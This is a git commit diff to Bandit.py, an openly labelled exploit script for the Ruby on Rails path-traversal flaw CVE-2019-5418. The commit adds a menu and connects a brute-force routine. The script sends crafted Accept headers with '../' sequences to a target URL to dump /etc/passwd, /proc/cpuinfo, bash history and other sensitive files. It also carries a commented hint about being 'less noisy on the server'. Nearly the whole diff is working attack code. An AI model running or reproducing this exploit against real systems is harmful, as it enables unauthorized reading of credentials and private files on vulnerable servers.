79911e07d73f282dbb57c54d08d88fc25b6d9ec6
NotoriousRebel <matt12299@yahoo.com>
2019-03-31 23:06:10 -0400

    Cleaned up menu and added brute force method.

--- Bandit.py
+++ Bandit.py
@@ -1,20 +1,23 @@
 import sys
 import time
 import random
+
 try:
     import requests
 except ImportError:
     print('\n\033[93m[!] Requests library not found, please install before proceeding.\n\n \033[0m')
     sys.exit(1)
 
+
 def banner():
     banner = """
-    ----------------------------------------------
-    Arbitrary Traversal exploit for Ruby on Rails
-    CVE-2019-5418
-    ----------------------------------------------
-    """
+	----------------------------------------------
+	Arbitrary Traversal exploit for Ruby on Rails
+	                 CVE-2019-5418
+	----------------------------------------------
+	"""
     print(banner)
+
 
 def check_args():
     if len(sys.argv) != 2:
@@ -36,6 +39,7 @@ def read_file(url, file):
     req = requests.get(url, headers=headers)
     return req
 
+
 def brute_force_data(url):
     # function to brute force sensitive data
     # assuming the person did not rename ruby on rails stable directories
@@ -50,18 +54,19 @@ def brute_force_data(url):
         headers = {'Accept': file + '{{'}
         req = requests.get(url, headers)
         output = [line.strip() for line in str(req.text).splitlines()]
-        #get number of lines in file before attempting to read files to determine if successful
-        if len(lines) != len(output):
+        # get number of lines in file before attempting to read files to determine if successful
+        if len(lines) != len(output) and lines[0] != output[0]:
             print('Dumping: ', files[0])
             for line in output:
                 print(line)
             num = i
             break
-        #time.sleep(random.randint(.5, 3))
-        #uncomment this to be less noisy on the server
+    # time.sleep(random.randint(1, 3))
+    # uncomment this to be less noisy on the server
     # now since we know where to look we can read sensitive files
     if num != '':
         files = files[1:]
+        # shift files list by one since already read first file
         for file in files:
             file = above * num + file
             headers = {'Accept': file + '{{'}
@@ -73,24 +78,36 @@ def brute_force_data(url):
                 for line in output:
                     print(line)
 
+
 def main():
     banner()
     check_args()
     url = sys.argv[1]
     while True:
+        menu = """\033[93m
+             Enter an option or a file path (enter quit or q to exit)\n
+             enter 1 for /etc/passwd \n
+             enter 2 for /proc/cpuinfo \n
+             enter 3 for bash history \n
+             enter 4 to brute force: \033[0m"""
+        #\033[93m[!]
+        #\033[0m
         try:
-            file = input("\033[93m[!] Enter file to read (enter quit or q to exit), enter 1 for /etc/passwd, enter 2 for /proc/cpuinfo enter 3 for bash history, enter 4 for seeds.rb: \033[0m")
+            file = input(menu)
         except Exception:
-            file = raw_input("\033[93m[!] Enter file to read (enter quit or q to exit): \033[0m")
+            file = raw_input(menu)
         if file == 'quit' or file == 'q':
-                break
+            break
         if file == '1':
             file = '../../../../../../../../../etc/passwd'
         elif file == '2':
             file = '../../../../../../../../../proc/cpuinfo'
-        elif file == "3":
+        elif file == '3':
             file = '../../../../../../../../../home/rails/.bash_history'
             # replace rails with other user if applicable
+        elif file == '4':
+            brute_force_data(url)
+            continue
         response = read_file(url, file)
         print(response.text)
 
